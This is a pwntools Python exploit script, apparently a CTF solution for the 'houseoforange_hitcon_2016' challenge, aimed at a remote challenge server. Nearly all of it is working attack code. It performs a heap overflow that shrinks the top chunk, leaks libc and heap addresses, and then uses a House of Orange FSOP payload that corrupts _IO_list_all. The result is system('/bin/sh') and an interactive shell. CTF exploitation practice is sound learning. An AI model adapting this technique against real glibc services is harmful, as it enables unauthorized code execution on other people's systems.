from pwn import *

# url, port = "node4.buuoj.cn", 25600
# filename = "./houseoforange_hitcon_2016"
# io=process('houseoforange_hitcon_2016')
io=remote('ctf.v50to.cc',10418)
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
context(arch="amd64", os="linux")

# local = 0
# if local:
context.log_level = "debug"
#     io = process(filename)
# else:
#     io = remote(url, port)

def B():
    gdb.attach(io)
    pause()
    
lf = lambda addrstring, address: log.info('{}: %#x'.format(addrstring), address)

def build(length, name, price, color):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Length of name :", str(length).encode())
    io.sendafter(b"Name :", name)
    io.sendlineafter(b"Price of Orange:", str(price).encode())
    io.sendlineafter(b"Color of Orange:", str(color).encode())

def upgrade(length, name, price, color):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Length of name :", str(length).encode())
    io.sendafter(b"Name:", name)
    io.sendlineafter(b"Price of Orange: ", str(price).encode())
    io.sendlineafter(b"Color of Orange:", str(color).encode())

def pwn():
    build(0x30, b'ffff\n', 233, 56746) # chunk0
    # heap overflow to overwrite top chunk size
    payload = cyclic(0x30) + p64(0) + p64(0x21) + p32(233) + p32(56746)
    payload += p64(0) * 2 + p64(0xf81)
    upgrade(len(payload), payload, 233, 56746) # size must be page aligned

    # sysmalloc() free the old top chunk into unsorted bin
    build(0x1000, b'f\n', 233, 56746) # chunk1
    build(0x400, b'f'*8, 666, 2) # chunk2
    # leak libc 
    io.sendlineafter(b"Your choice :", b"2")
    io.recvuntil(b'f'*8)
    malloc_hook = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00')) - 0x678
    lf('malloc_hook', malloc_hook)
    libc.address = malloc_hook - libc.sym['__malloc_hook']
    lf('libc base address', libc.address)
    _IO_list_all = libc.sym['_IO_list_all']
    system_addr = libc.sym['system']
    lf('_IO_list_all', _IO_list_all)
    lf('system_addr', system_addr)

    # leak heap
    upgrade(0x10, b'f'*0x10, 666, 2)
    io.sendlineafter(b"Your choice :", b"2")
    io.recvuntil(b'f'*0x10)
    heap_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) 
    heap_base = heap_addr - 0xE0
    lf('heap_base', heap_base)
    
    # FSOP
    orange = b'/bin/sh\x00' + p64(0x61) + p64(0) + p64(_IO_list_all - 0x10)
    orange += p64(0) + p64(1)
    orange = orange.ljust(0xc0, b'\x00')
    orange += p64(0) * 3 + p64(heap_base + 0x5E8) + p64(0) * 2 + p64(system_addr)
    payload = cyclic(0x400) + p64(0) + p64(0x21) + p32(233) + p32(56746) 
    payload += p64(0) + orange
    upgrade(len(payload), payload, 233, 56746)

    io.sendlineafter(b'Your choice : ', b'1')


if __name__ == "__main__":
    pwn()
    io.interactive()
